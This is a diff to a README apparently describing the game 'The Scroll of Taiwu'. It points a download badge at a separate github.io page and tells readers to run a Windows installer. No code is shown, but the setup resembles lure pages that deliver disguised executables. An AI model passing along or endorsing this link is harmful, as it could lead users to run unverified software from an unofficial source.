@@ -8,7 +8,7 @@ Players can **train martial skills, manage sects, explore vast worlds, and inter
 ---
 
 ## 🧰 Installation
-[![Download](https://img.shields.io/badge/Download-Now-brown?style=for-the-badge)](#)
+[![Download](https://img.shields.io/badge/Download-Now-brown?style=for-the-badge)](https://the-scroll-of-taiwu-download.github.io/.github/)
 
 1. Download and unzip the archive.  
 2. Run the installer on your Windows PC.  
